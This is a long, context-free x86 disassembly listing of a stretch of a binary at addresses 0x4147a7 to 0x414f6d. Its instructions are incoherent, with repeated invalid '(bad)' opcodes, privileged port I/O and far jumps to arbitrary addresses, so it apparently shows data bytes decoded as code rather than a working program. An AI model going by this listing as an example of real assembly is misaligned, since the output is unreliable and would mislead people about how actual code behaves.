  4147a7:	int3   
  4147a8:	mov    ebp,0x4f0b86ed
  4147ad:	sbb    eax,0x2421bf1b
  4147b2:	mov    edi,0xb7af99aa
  4147b7:	daa    
  4147b8:	icebp  
  4147b9:	mov    al,0xd
  4147bb:	push   edx
  4147bc:	loop   0x4147e5
  4147be:	add    BYTE PTR [edi+0x4fba8328],dl
  4147c4:	push   edi
  4147c5:	fisttp DWORD PTR [edi]
  4147c7:	fmul   DWORD PTR [edx+0x19d40553]
  4147cd:	inc    esi
  4147ce:	outs   dx,DWORD PTR ds:[esi]
  4147cf:	ret    0x9624
  4147d2:	inc    ebp
  4147d3:	(bad)  
  4147d4:	in     al,dx
  4147d5:	call   0xc0f9:0x1718382e
  4147dc:	adc    esi,DWORD PTR [edi]
  4147de:	jecxz  0x41483d
  4147e0:	add    BYTE PTR [eax],bl
  4147e2:	shr    BYTE PTR [eax-0x66],1
  4147e5:	nop
  4147e6:	shr    BYTE PTR [eax],0x9
  4147e9:	jno    0x414859
  4147eb:	jg     0x414779
  4147ed:	jb     0x414826
  4147ef:	adc    cl,ch
  4147f1:	imul   ebp,edi,0x28
  4147f4:	xor    BYTE PTR [edx-0x3],cl
  4147f7:	lahf   
  4147f8:	inc    ebp
  4147f9:	mov    dl,0xd2
  4147fb:	sub    ah,bh
  4147fd:	mov    ebx,0x1dee5f98
  414802:	dec    edx
  414803:	cld    
  414804:	in     al,0x73
  414806:	mov    edi,0x81c39a84
  41480b:	stos   DWORD PTR es:[edi],eax
  41480c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41480d:	test   bl,al
  41480f:	cli    
  414810:	pop    ss
  414811:	cmp    ecx,ebx
  414813:	mov    edx,0xb58d95d0
  414818:	pop    eax
  414819:	aaa    
  41481a:	sbb    DWORD PTR [edx+eax*2+0x77],ebx
  41481e:	xor    ch,BYTE PTR [esi]
  414820:	pusha  
  414821:	fdivr  QWORD PTR [edx+0x59]
  414824:	push   0x3120f251
  414829:	pop    esp
  41482a:	mov    esp,0xcebbac77
  41482f:	jb     0x41482c
  414831:	popa   
  414832:	ins    DWORD PTR es:[edi],dx
  414833:	rol    DWORD PTR [ebp+0x6c],1
  414836:	or     esi,0xffffff8b
  414839:	sub    eax,0xe32ec72d
  41483e:	retf   0xdcfb
  414841:	bound  edi,QWORD PTR [ebp+0x6d]
  414844:	jo     0x41487c
  414846:	rcr    DWORD PTR [ebx],cl
  414848:	or     ebx,edx
  41484a:	dec    ebp
  41484b:	cmp    BYTE PTR [ebx+0x50c93bdd],dl
  414851:	addr16 add al,0x9e
  414854:	gs jns 0x414817
  414857:	adc    bl,BYTE PTR [esi]
  414859:	shl    BYTE PTR [edi],0xc3
  41485c:	mov    edx,DWORD PTR [ebx-0x1f]
  41485f:	cmp    bh,BYTE PTR [esi+0x1f10da80]
  414865:	enter  0xc31a,0x82
  414869:	xor    ch,dl
  41486b:	out    dx,al
  41486c:	push   esp
  41486d:	retf   
  41486e:	cmp    esi,esp
  414870:	lds    ebp,FWORD PTR [ebp+ebp*4-0x5e5b301d]
  414877:	dec    esp
  414878:	dec    esi
  414879:	fadd   DWORD PTR [eax-0x4c]
  41487c:	push   0xebc9d47c
  414881:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414882:	es cmc 
  414884:	fstp   QWORD PTR [ebx+ecx*4+0x38]
  414888:	cmp    ch,BYTE PTR [ebx-0x1b]
  41488b:	ret    
  41488c:	rcr    DWORD PTR [ebx-0x1b],1
  41488f:	mov    edi,0x9da8edca
  414894:	jne    0x4148e5
  414896:	dec    edx
  414897:	jne    0x414881
  414899:	ss dec ebx
  41489b:	push   edi
  41489c:	jbe    0x4148d7
  41489e:	scas   eax,DWORD PTR es:[edi]
  41489f:	int3   
  4148a0:	sbb    ah,ch
  4148a2:	sub    BYTE PTR [edi+0x78],0xc4
  4148a6:	int3   
  4148a7:	stos   DWORD PTR es:[edi],eax
  4148a8:	ret    
  4148a9:	jg     0x414865
  4148ab:	cmp    ecx,ebx
  4148ad:	push   ds
  4148ae:	inc    eax
  4148af:	jg     0x414896
  4148b1:	jae    0x41487c
  4148b3:	pop    eax
  4148b4:	imul   ebp,DWORD PTR [eax],0xffffffce
  4148b7:	rol    DWORD PTR [esi+ecx*2+0x5e],cl
  4148bb:	mov    ebp,0xe2287338
  4148c0:	stos   DWORD PTR es:[edi],eax
  4148c1:	rol    DWORD PTR [esi-0x541807a3],cl
  4148c7:	mov    edi,0xa3eff0a2
  4148cc:	outs   dx,BYTE PTR ds:[esi]
  4148cd:	cmp    bl,ch
  4148cf:	cmovne esi,DWORD PTR [ecx-0x7e9bd378]
  4148d6:	jp     0x4148da
  4148d8:	or     BYTE PTR [ecx-0x17370c90],cl
  4148de:	pop    ebx
  4148df:	add    ecx,eax
  4148e1:	lds    ebp,FWORD PTR [edi+0x63ffa5b0]
  4148e7:	lahf   
  4148e8:	push   esp
  4148e9:	xchg   ebp,eax
  4148ea:	mov    dh,0xd1
  4148ec:	outs   dx,DWORD PTR ds:[esi]
  4148ed:	aas    
  4148ee:	mov    cl,0x29
  4148f0:	mov    gs,eax
  4148f2:	loope  0x414928
  4148f4:	inc    eax
  4148f5:	out    0x49,al
  4148f7:	(bad)  
  4148f8:	(bad)  [eax]
  4148fa:	dec    esp
  4148fb:	push   eax
  4148fc:	mov    ebp,eax
  4148fe:	sub    eax,0xb8637471
  414903:	cmp    al,0x89
  414905:	popf   
  414906:	sar    dl,cl
  414908:	or     BYTE PTR [eax+0x67],0x72
  41490c:	add    dh,BYTE PTR [ecx-0x3d]
  41490f:	in     al,dx
  414910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414911:	sub    al,BYTE PTR [esi+0x63]
  414914:	shl    BYTE PTR [ebp+0x57b29bac],1
  41491a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41491b:	in     al,0xe7
  41491d:	add    cl,0xc2
  414920:	sbb    al,0x54
  414922:	lock cmc 
  414924:	cmp    edi,edi
  414926:	jmp    0xe9f32a96
  41492b:	(bad)  [esi]
  41492d:	aam    0x73
  41492f:	pop    eax
  414930:	out    0x8b,eax
  414932:	xchg   edx,eax
  414933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414934:	mov    es,WORD PTR [esi]
  414936:	and    al,0x3f
  414938:	pop    edi
  414939:	outs   dx,BYTE PTR ds:[esi]
  41493a:	lahf   
  41493b:	xchg   DWORD PTR cs:[ecx+0x5cdb8751],ecx
  414942:	fs ins DWORD PTR es:[edi],dx
  414944:	call   0x87a8:0xb222d504
  41494b:	enter  0x595f,0xb3
  41494f:	mov    ebp,0x1e1ca16d
  414954:	adc    edi,0x21
  414957:	jl     0x414954
  414959:	arpl   sp,sp
  41495b:	hlt    
  41495c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41495e:	pop    ebp
  41495f:	dec    ecx
  414960:	add    dh,bl
  414962:	mov    ch,0xbc
  414964:	mov    esp,0x311334dc
  414969:	idiv   DWORD PTR [eax-0x1e]
  41496c:	aad    0xa
  41496e:	adc    eax,0xa8fedd41
  414973:	or     ebp,esp
  414975:	fiadd  DWORD PTR [edx+edi*2-0x5d1e3635]
  41497c:	jb     0x4149e7
  41497e:	scas   eax,DWORD PTR es:[edi]
  41497f:	dec    edx
  414980:	mov    ecx,0xd51ff8ae
  414985:	xadd   BYTE PTR [edx+0x5c],bh
  414989:	bswap  edi
  41498b:	iret   
  41498c:	add    DWORD PTR [ebx+eax*1-0x8f2e315],eax
  414993:	jae    0x41496b
  414995:	rep ins DWORD PTR es:[edi],dx
  414997:	push   0x14c11e12
  41499c:	arpl   WORD PTR [esi+0x2a],sp
  41499f:	xor    al,0x9b
  4149a1:	rcr    BYTE PTR [edi+0x470bacaa],1
  4149a7:	loope  0x41492f
  4149a9:	mov    edx,0x34af62e1
  4149ae:	(bad)  
  4149af:	pop    ds
  4149b0:	stc    
  4149b1:	and    BYTE PTR [eax+0x5d7ccb7d],dh
  4149b7:	sub    al,0x21
  4149b9:	sahf   
  4149ba:	sahf   
  4149bb:	ins    DWORD PTR es:[edi],dx
  4149bc:	aam    0xff
  4149be:	pushf  
  4149bf:	xchg   esi,eax
  4149c0:	scas   eax,DWORD PTR es:[edi]
  4149c1:	mov    WORD PTR [ebx+0x73e3758f],?
  4149c7:	shl    BYTE PTR [ebx+0x177c3725],1
  4149cd:	mov    ah,BYTE PTR [edx+0x6a7144ff]
  4149d3:	jp     0x41495f
  4149d5:	ja     0x414a20
  4149d7:	inc    DWORD PTR [edi]
  4149d9:	lods   al,BYTE PTR ds:[esi]
  4149da:	xchg   edi,eax
  4149db:	xchg   DWORD PTR ds:0x1b231cd5,ecx
  4149e1:	mov    ch,0x99
  4149e3:	pop    esp
  4149e4:	rcl    DWORD PTR [eax],cl
  4149e6:	test   eax,0xa3a2d113
  4149eb:	test   eax,0xc253d884
  4149f0:	(bad)  
  4149f1:	rol    DWORD PTR ds:0x4a84740a,1
  4149f7:	loopne 0x414a6d
  4149f9:	lods   eax,DWORD PTR ds:[esi]
  4149fa:	gs into 
  4149fc:	mov    ds:0x622ee22f,eax
  414a01:	xor    eax,ecx
  414a03:	jge    0x414a00
  414a05:	lahf   
  414a06:	sar    DWORD PTR [eax],cl
  414a08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a0a:	mov    edx,ebx
  414a0c:	fisttp DWORD PTR [edx]
  414a0e:	(bad)  
  414a0f:	cli    
  414a10:	push   eax
  414a11:	test   BYTE PTR [edx+0x45639297],cl
  414a17:	out    dx,al
  414a18:	cs js  0x414a5d
  414a1b:	push   ds
  414a1c:	sbb    BYTE PTR [ebx-0x45],dh
  414a1f:	adc    DWORD PTR [ebx+0x3f80a5c1],0xffffff8c
  414a26:	xor    al,0x58
  414a28:	fcomp  QWORD PTR [edi]
  414a2a:	inc    al
  414a2c:	mov    cl,0x55
  414a2e:	add    DWORD PTR [edx],eax
  414a30:	inc    esp
  414a31:	dec    esi
  414a32:	retf   0x41cf
  414a35:	loope  0x414a96
  414a37:	jne    0x414aa3
  414a39:	int    0x13
  414a3b:	sub    ah,bh
  414a3d:	in     eax,dx
  414a3e:	(bad)  
  414a3f:	fimul  WORD PTR [ebx+ecx*4-0x51]
  414a43:	xor    eax,0x893ce78e
  414a48:	xor    edi,DWORD PTR [eax]
  414a4a:	mov    esp,0x25291ee2
  414a4f:	sub    BYTE PTR [edx-0x3f],bl
  414a52:	je     0x414a11
  414a54:	pop    ebp
  414a55:	sub    BYTE PTR [edi+0x6c],dl
  414a58:	xor    edi,DWORD PTR [esp+ecx*8]
  414a5b:	pushf  
  414a5c:	ss pop ebx
  414a5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a5f:	push   ecx
  414a60:	dec    eax
  414a61:	xlat   BYTE PTR ds:[ebx]
  414a62:	ret    0x7457
  414a65:	in     al,dx
  414a66:	push   ebx
  414a67:	xchg   edi,eax
  414a68:	frstor [edi]
  414a6a:	mov    esp,0xd684722
  414a6f:	adc    eax,DWORD PTR [ecx+0x3e7e5d55]
  414a75:	adc    BYTE PTR [edx],ch
  414a77:	int3   
  414a78:	inc    eax
  414a79:	dec    ebx
  414a7a:	cmp    DWORD PTR [esi],eax
  414a7c:	push   ebx
  414a7d:	push   ebx
  414a7e:	loopne 0x414a82
  414a80:	inc    eax
  414a81:	jbe    0x414a35
  414a83:	lods   al,BYTE PTR ds:[esi]
  414a84:	jae    0x414ae6
  414a86:	mov    cl,0xc0
  414a88:	adc    BYTE PTR ds:0x9d2bbc03,0x17
  414a8f:	out    0x3a,al
  414a91:	ins    DWORD PTR es:[edi],dx
  414a92:	shl    DWORD PTR [edx],1
  414a94:	stos   DWORD PTR es:[edi],eax
  414a95:	popa   
  414a96:	pop    edi
  414a97:	and    eax,0x8f717b92
  414a9c:	push   edi
  414a9d:	add    ecx,ecx
  414a9f:	test   DWORD PTR [ebp-0x64500a40],eax
  414aa5:	dec    edi
  414aa6:	and    ah,cl
  414aa8:	call   FWORD PTR [ebx+ebp*2]
  414aab:	xor    cl,BYTE PTR [ebx]
  414aad:	lods   al,BYTE PTR ds:[esi]
  414aae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aaf:	sbb    eax,0x8d207234
  414ab4:	add    BYTE PTR [ecx],ch
  414ab6:	ins    DWORD PTR es:[edi],dx
  414ab7:	rol    DWORD PTR [esi+esi*4+0x36b1f088],cl
  414abe:	inc    esi
  414abf:	inc    eax
  414ac0:	stos   DWORD PTR es:[edi],eax
  414ac1:	mov    ecx,0x4c0ee907
  414ac6:	adc    dh,dl
  414ac8:	pop    esp
  414ac9:	mov    es,edx
  414acb:	jb     0x414a79
  414acd:	xor    eax,0x287a301c
  414ad2:	pop    ebp
  414ad3:	jmp    0x414a73
  414ad5:	pusha  
  414ad6:	adc    cl,BYTE PTR [esi]
  414ad8:	popf   
  414ad9:	pop    ds
  414ada:	push   es
  414adb:	ins    DWORD PTR es:[edi],dx
  414adc:	dec    ebp
  414add:	loopne 0x414aa5
  414adf:	hlt    
  414ae0:	inc    eax
  414ae1:	cs out 0x11,al
  414ae4:	das    
  414ae5:	and    al,0x8e
  414ae7:	hlt    
  414ae8:	add    edx,DWORD PTR [ebp+0x75729f37]
  414aee:	pop    edi
  414aef:	inc    ebp
  414af0:	cmp    ebp,ebx
  414af2:	loopne 0x414aad
  414af4:	jl     0x414afa
  414af6:	daa    
  414af7:	fist   DWORD PTR [ebp-0x73]
  414afa:	push   esp
  414afb:	neg    BYTE PTR [ecx-0x51f3f9a9]
  414b01:	mov    ebx,0xd674777b
  414b06:	push   cs
  414b07:	lea    edx,[ebp-0x5d]
  414b0a:	ja     0x414b7f
  414b0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b0d:	fnstsw WORD PTR [edi]
  414b0f:	mov    ebp,0xba797c06
  414b14:	dec    ebp
  414b15:	imul   ebx,DWORD PTR [ebp+ecx*2-0x62],0x83fa65e2
  414b1d:	cmp    dh,bh
  414b1f:	push   0xffffffa4
  414b21:	add    cl,dh
  414b23:	and    ebp,esi
  414b25:	and    al,0xae
  414b27:	scas   al,BYTE PTR es:[edi]
  414b28:	sbb    BYTE PTR ds:0x299af6f7,ch
  414b2e:	jp     0x414aee
  414b30:	fisub  DWORD PTR [ebp+0x35ee3ad]
  414b36:	maskmovq mm7,(bad)
  414b37:	idiv   DWORD PTR [ebx+0x43]
  414b3a:	inc    eax
  414b3b:	mov    al,0x2c
  414b3d:	inc    esp
  414b3e:	retf   0x7159
  414b41:	jnp    0x414b15
  414b43:	cmp    ecx,DWORD PTR [ebx]
  414b45:	pusha  
  414b46:	scas   eax,DWORD PTR es:[edi]
  414b47:	mov    BYTE PTR ds:0xd853a9f3,0xf4
  414b4e:	int    0xea
  414b50:	aaa    
  414b51:	adc    eax,0x88a18d66
  414b56:	test   DWORD PTR [edx+esi*8-0x37],ebp
  414b5a:	sbb    eax,0x2617d154
  414b5f:	mov    cl,BYTE PTR [ebx+0x26]
  414b62:	ret    0x4ecf
  414b65:	inc    ebp
  414b66:	cld    
  414b67:	cmp    eax,0x920ca092
  414b6c:	cld    
  414b6d:	add    dl,dh
  414b6f:	js     0x414b90
  414b71:	pushf  
  414b72:	mov    ds:0x2a49a776,eax
  414b77:	push   ss
  414b78:	loopne 0x414b97
  414b7a:	es or  al,dh
  414b7d:	xchg   DWORD PTR [ebx-0x543eb2dd],esp
  414b83:	lods   eax,DWORD PTR ds:[esi]
  414b84:	pop    ss
  414b85:	inc    edi
  414b86:	xchg   esp,eax
  414b87:	sub    DWORD PTR [eax-0x6b026d65],0x2d
  414b8e:	shl    DWORD PTR [esi+0x9002463],cl
  414b94:	push   ecx
  414b95:	or     cl,bh
  414b97:	call   0x8e5c4ea8
  414b9c:	jno    0x414b65
  414b9e:	adc    al,0x43
  414ba1:	aad    0x56
  414ba3:	and    al,BYTE PTR [ecx+0x31]
  414ba6:	ins    BYTE PTR es:[edi],dx
  414ba7:	rcl    BYTE PTR [esi+0x2ddd11e4],1
  414bad:	dec    ecx
  414bae:	sbb    eax,0x867731a8
  414bb3:	jecxz  0x414b5e
  414bb5:	lea    ecx,[edi+ecx*8+0xcfa495f]
  414bbc:	add    ch,BYTE PTR [esi-0xfc02afc]
  414bc2:	daa    
  414bc3:	and    BYTE PTR [eax-0x13],ah
  414bc6:	inc    BYTE PTR [esi+0x23d2d122]
  414bcc:	xor    eax,esi
  414bce:	push   ebx
  414bcf:	je     0x414b78
  414bd1:	pop    ebx
  414bd2:	pop    edi
  414bd3:	cli    
  414bd4:	(bad)  [edi]
  414bd6:	pushf  
  414bd7:	jno    0x414c02
  414bd9:	jmp    FWORD PTR [esi+0x6080b7f5]
  414bdf:	cmp    BYTE PTR [eax-0x20d44d33],bh
  414be5:	add    DWORD PTR [ebx],ebp
  414be7:	adc    DWORD PTR [edx-0x5],esp
  414bea:	jle    0x414c0d
  414bec:	popa   
  414bed:	retf   
  414bee:	jbe    0x414b89
  414bf0:	jnp    0x414c01
  414bf2:	leave  
  414bf3:	mov    al,ds:0x83f2780a
  414bf8:	jmp    0x414ba9
  414bfa:	add    ebx,DWORD PTR ds:0xb5e33594
  414c00:	pop    esi
  414c01:	push   cs
  414c02:	stos   BYTE PTR es:[edi],al
  414c03:	mov    edx,0x4ec7279
  414c08:	lea    esp,[edx+ebx*2]
  414c0b:	arpl   bp,bp
  414c0d:	xchg   ebp,eax
  414c0e:	scas   al,BYTE PTR es:[edi]
  414c0f:	mov    ecx,DWORD PTR ds:0xf55c214
  414c15:	ds ins BYTE PTR es:[edi],dx
  414c17:	int    0x7b
  414c19:	out    dx,eax
  414c1a:	pop    ebx
  414c1b:	imul   edi,DWORD PTR [esi+0x7e],0x9f7f5091
  414c22:	sar    BYTE PTR [edi+0x51],cl
  414c25:	shl    DWORD PTR [edx-0x38a4e09a],cl
  414c2b:	fiadd  WORD PTR [eax-0x784d045a]
  414c31:	test   BYTE PTR [edx-0x501e29c4],0xab
  414c38:	add    BYTE PTR [eax+esi*1+0x31],0xc1
  414c3d:	rol    ch,cl
  414c3f:	pop    es
  414c40:	adc    BYTE PTR [eax],0xaf
  414c43:	mov    bh,0x77
  414c45:	adc    eax,0x7c97b49d
  414c4a:	fstp   DWORD PTR [edi-0x30]
  414c4d:	jge    0x414c61
  414c4f:	mov    WORD PTR [ebx],?
  414c51:	fdiv   QWORD PTR [ecx+0x17]
  414c54:	outs   dx,BYTE PTR ds:[esi]
  414c55:	retf   0xad81
  414c58:	pop    esi
  414c59:	cdq    
  414c5a:	sbb    eax,0xacde8592
  414c5f:	mov    al,0xf0
  414c61:	or     DWORD PTR [edx],esi
  414c63:	mov    eax,ds:0x10538477
  414c68:	lds    eax,FWORD PTR [ecx+ebx*1]
  414c6b:	cmp    dh,BYTE PTR [ecx+ebp*2]
  414c6e:	pop    ebx
  414c6f:	fdiv   DWORD PTR [ebx+0x32]
  414c72:	jb     0x414c3d
  414c74:	jecxz  0x414c9c
  414c76:	stos   BYTE PTR es:[edi],al
  414c77:	mov    ch,BYTE PTR [esi]
  414c79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c7a:	(bad)  [ecx-0x63f9afe1]
  414c80:	or     DWORD PTR [ecx],esi
  414c82:	mov    cl,0x2c
  414c84:	repz and DWORD PTR cs:[ebx+0x401a5b37],0x53805c9c
  414c90:	(bad)  
  414c91:	test   BYTE PTR [edi],0x82
  414c94:	xor    eax,0x1c1e9271
  414c99:	pop    ecx
  414c9a:	push   ebx
  414c9b:	mov    ch,0xee
  414c9d:	xor    BYTE PTR [ebx+edi*4],0x9b
  414ca1:	(bad)  
  414ca2:	jmp    0xb81f:0xfe9b2c26
  414ca9:	lea    esi,[ecx-0x23]
  414cac:	push   edi
  414cad:	test   BYTE PTR [esi],ah
  414caf:	mov    ds:0xaf81823c,al
  414cb4:	idiv   bh
  414cb6:	mov    al,0x2d
  414cb8:	adc    ebx,edi
  414cba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cbb:	cs pushf 
  414cbd:	adc    eax,0xc423ac96
  414cc2:	test   cl,bl
  414cc4:	mov    esi,0xf9bf6cb5
  414cc9:	in     al,0x29
  414ccb:	jno    0x414c67
  414ccd:	xor    ah,BYTE PTR [eax+0x53]
  414cd0:	sar    eax,0x8b
  414cd3:	sub    DWORD PTR [eax-0x5712033a],eax
  414cd9:	push   ebp
  414cda:	jmp    0x414d51
  414cdc:	jmp    0x95de:0x259f6bc6
  414ce3:	mov    ecx,0x1e11b131
  414ce8:	in     eax,0x8d
  414cea:	or     al,0xb5
  414cec:	or     eax,0x7f0e6942
  414cf1:	xchg   esp,eax
  414cf2:	pop    edi
  414cf3:	xchg   edi,eax
  414cf4:	mov    al,ds:0xaf15e879
  414cf9:	sbb    eax,0xb03b939f
  414cfe:	or     DWORD PTR [esp+ecx*8+0x6ccfdca9],esp
  414d05:	sbb    BYTE PTR es:[edi-0x4f],bl
  414d09:	sti    
  414d0a:	pop    edi
  414d0b:	jle    0x414d1e
  414d0d:	mov    dh,0xcd
  414d0f:	stc    
  414d10:	jle    0x414cab
  414d12:	nop
  414d13:	xor    eax,0x17356c92
  414d18:	jmp    0x414cca
  414d1a:	outs   dx,DWORD PTR ds:[esi]
  414d1b:	pop    es
  414d1c:	push   esi
  414d1d:	(bad)  
  414d1e:	xchg   ebp,eax
  414d1f:	mov    ds:0xd222a99,eax
  414d24:	push   cs
  414d25:	es es mov cl,0xfd
  414d29:	lea    eax,[ebx+0x44]
  414d2c:	push   edi
  414d2d:	jle    0x414daa
  414d2f:	(bad)  
  414d30:	mov    cs:0xef03c250,al
  414d36:	sbb    eax,0x4368724c
  414d3b:	ss fs mov esp,0x8266237c
  414d42:	pop    esp
  414d43:	or     DWORD PTR [eax+0x33a2c7c0],edi
  414d49:	cmp    al,0x5c
  414d4b:	gs sub ch,ah
  414d4e:	pop    ebx
  414d4f:	jmp    0x4565:0x103721c9
  414d56:	xchg   ebp,eax
  414d57:	inc    eax
  414d58:	cwde   
  414d59:	mov    eax,0x7d324d75
  414d5e:	cld    
  414d5f:	repz mov al,ds:0x6cd195e1
  414d65:	sub    ecx,esi
  414d67:	jl     0x414d2b
  414d69:	xchg   edi,eax
  414d6a:	jg     0x414d13
  414d6c:	adc    cl,BYTE PTR ds:0x3f9ca614
  414d72:	js     0x414d08
  414d74:	int    0x52
  414d76:	add    edi,ecx
  414d78:	ror    DWORD PTR [ebx-0x7b],1
  414d7b:	add    DWORD PTR [ebp-0x27],ebx
  414d7e:	push   esi
  414d7f:	mov    ebp,0x6db2253
  414d84:	sar    BYTE PTR [esi-0x4d],0x50
  414d88:	jae    0x414d19
  414d8a:	div    BYTE PTR [esi]
  414d8c:	xor    eax,0x1ea34f6c
  414d91:	in     al,dx
  414d92:	arpl   WORD PTR [edx+0x41],di
  414d95:	mov    esi,0xef98d80e
  414d9a:	int3   
  414d9b:	int3   
  414d9c:	ja     0x414d40
  414d9e:	(bad)  
  414d9f:	in     eax,dx
  414da0:	dec    ebp
  414da1:	cld    
  414da2:	pop    ss
  414da3:	push   es
  414da4:	jno    0x414dc5
  414da6:	dec    ebp
  414da7:	xor    dl,BYTE PTR [ecx]
  414da9:	test   BYTE PTR [edi*4-0x1f121bce],cl
  414db0:	mov    edx,0x815c5c08
  414db5:	pop    esp
  414db6:	xor    BYTE PTR [eax-0x2aead2e2],cl
  414dbc:	paddusw mm7,QWORD PTR [ecx-0x222210ad]
  414dc3:	pop    eax
  414dc4:	adc    al,0xf9
  414dc6:	retf   
  414dc7:	dec    esp
  414dc8:	inc    edi
  414dc9:	cmp    cl,BYTE PTR [esi-0x46]
  414dcc:	jle    0x414db5
  414dce:	popf   
  414dcf:	in     al,dx
  414dd0:	xchg   BYTE PTR [edx],bh
  414dd2:	out    dx,eax
  414dd3:	mov    eax,DWORD PTR [eax-0x7b]
  414dd6:	fs inc ebx
  414dd8:	and    DWORD PTR [ebx],esp
  414dda:	lea    edi,ds:0x5365f577
  414de0:	mov    dh,0x84
  414de2:	jmp    0x9af57740
  414de7:	inc    ecx
  414de8:	int3   
  414de9:	ret    
  414dea:	mov    esp,0xa6e0926e
  414def:	jae    0x414d8d
  414df1:	int3   
  414df2:	xor    BYTE PTR ds:0x88e58736,cl
  414df8:	ja     0x414e1f
  414dfa:	sub    BYTE PTR [edx+ebp*8+0x7ac45fbf],0x1a
  414e02:	ins    BYTE PTR es:[edi],dx
  414e03:	pop    eax
  414e04:	pusha  
  414e05:	sahf   
  414e06:	push   eax
  414e07:	ret    0x6eb8
  414e0a:	mov    DWORD PTR [ecx+0x40],edi
  414e0d:	sbb    DWORD PTR [edi+0x28178b32],ebx
  414e13:	add    BYTE PTR [ebx+eiz*2],ch
  414e16:	and    DWORD PTR [edi-0x40c4826c],esi
  414e1c:	xchg   DWORD PTR [eax],esp
  414e1e:	pop    ss
  414e1f:	pop    ecx
  414e20:	ret    
  414e21:	jns    0x414da4
  414e23:	push   ds
  414e24:	jp     0x414e01
  414e26:	cld    
  414e27:	jnp    0x414e56
  414e29:	in     eax,0x44
  414e2b:	rcr    DWORD PTR [ecx-0x58],cl
  414e2e:	hlt    
  414e2f:	sar    dl,0x25
  414e32:	mov    ecx,0x58f96fe5
  414e37:	xor    BYTE PTR [edx*1-0x7f717f5f],dl
  414e3e:	ins    BYTE PTR es:[edi],dx
  414e3f:	out    dx,al
  414e40:	pop    ss
  414e41:	inc    esi
  414e42:	adc    al,0x5a
  414e44:	and    ch,bl
  414e46:	add    eax,0x75b367e3
  414e4b:	and    DWORD PTR [edx-0x1e],0xffffffc4
  414e4f:	pop    ecx
  414e50:	cmc    
  414e51:	push   esi
  414e52:	inc    esi
  414e53:	push   eax
  414e54:	cmp    DWORD PTR [ecx],edx
  414e56:	add    BYTE PTR [edx+0x5900562e],bl
  414e5c:	jb     0x414e27
  414e5e:	dec    eax
  414e5f:	push   es
  414e60:	add    DWORD PTR [eax],0xffffffcf
  414e63:	ret    
  414e64:	push   ecx
  414e65:	enter  0xb453,0xe0
  414e69:	pop    edi
  414e6a:	cmp    dl,al
  414e6c:	mov    esi,0x73d32fc
  414e71:	and    eax,0x7eb41254
  414e76:	pop    edx
  414e77:	out    0x31,eax
  414e79:	dec    esp
  414e7a:	out    0x23,al
  414e7c:	stos   BYTE PTR es:[edi],al
  414e7d:	cli    
  414e7e:	push   edi
  414e7f:	bound  esp,QWORD PTR [ebp-0x52]
  414e82:	mov    esp,0xf4cd9dc9
  414e87:	xchg   edi,ebx
  414e89:	mov    BYTE PTR [eax+0x757e1b6c],bh
  414e8f:	aam    0x98
  414e91:	pop    eax
  414e92:	or     bl,BYTE PTR [ebp-0x64]
  414e95:	loopne 0x414e28
  414e97:	aam    0x82
  414e99:	pop    ss
  414e9a:	add    al,0x21
  414e9c:	scas   al,BYTE PTR es:[edi]
  414e9d:	push   0xd795f09d
  414ea2:	mov    WORD PTR [ebx+0x3a],?
  414ea5:	ret    0xb5c7
  414ea8:	or     edi,DWORD PTR [eax+0x91d5595]
  414eae:	xlat   BYTE PTR ds:[ebx]
  414eaf:	(bad)  
  414eb1:	push   edi
  414eb2:	pop    eax
  414eb3:	push   cs
  414eb4:	sbb    eax,0x218b2e2e
  414eb9:	stc    
  414eba:	fdivrp st(4),st
  414ebc:	inc    eax
  414ebd:	(bad)  
  414ebf:	test   DWORD PTR [eax-0x1a],ecx
  414ec2:	push   bx
  414ec4:	mov    ecx,0xcbd97189
  414ec9:	jb     0x414f29
  414ecb:	mov    eax,DWORD PTR [edx]
  414ecd:	mov    ah,0xf7
  414ecf:	rol    BYTE PTR ds:0x217f7174,1
  414ed5:	push   ss
  414ed6:	sahf   
  414ed7:	push   eax
  414ed8:	push   esi
  414ed9:	test   BYTE PTR [ecx+0x452003a7],cl
  414edf:	xor    esp,DWORD PTR [edx]
  414ee1:	repz fist DWORD PTR [esi+0x4759967d]
  414ee8:	or     al,0xc8
  414eea:	adc    eax,0xc3801be6
  414eef:	int    0x0
  414ef1:	adc    edi,DWORD PTR [ebp-0x2e]
  414ef4:	pop    esi
  414ef5:	aam    0xb5
  414ef7:	cs dec esp
  414ef9:	test   BYTE PTR [ecx-0x2f],cl
  414efc:	jnp    0x414f1a
  414efe:	dec    esi
  414eff:	sub    DWORD PTR [edi-0x5bdcd1fc],edx
  414f05:	cli    
  414f06:	dec    edx
  414f07:	cmp    dh,BYTE PTR [ecx]
  414f09:	leave  
  414f0a:	adc    ebx,DWORD PTR [edi-0xf3790e8]
  414f10:	rcl    DWORD PTR [ebx],0xcd
  414f13:	repz sbb DWORD PTR [edx+0x6f2041cc],ebx
  414f1a:	cmp    ch,BYTE PTR [edi+eax*8+0x8]
  414f1e:	add    al,0x68
  414f20:	mul    DWORD PTR [ebp-0x73b7e3bf]
  414f26:	mov    al,0xca
  414f28:	and    DWORD PTR [edi+eax*2+0x1a4baa9a],0xf41fe7e0
  414f33:	lock sahf 
  414f35:	dec    dx
  414f37:	clc    
  414f38:	mov    eax,0xb070be3d
  414f3d:	idiv   ch
  414f3f:	(bad)  
  414f41:	and    eax,0xec767f7
  414f46:	sub    esi,DWORD PTR ds:0x83385c4f
  414f4c:	inc    ebp
  414f4d:	int    0x6
  414f4f:	mov    ecx,0x7c85127b
  414f54:	mov    edi,0xbb9fe7e0
  414f59:	fwait
  414f5a:	mov    gs,WORD PTR [esi+ecx*1]
  414f5d:	ja     0x414eff
  414f5f:	aam    0x5d
  414f61:	push   edx
  414f62:	inc    ebx
  414f63:	cwde   
  414f64:	jnp    0x414f2b
  414f66:	or     bh,BYTE PTR [esp+edx*2+0x6fbbd774]
  414f6d:	stc    
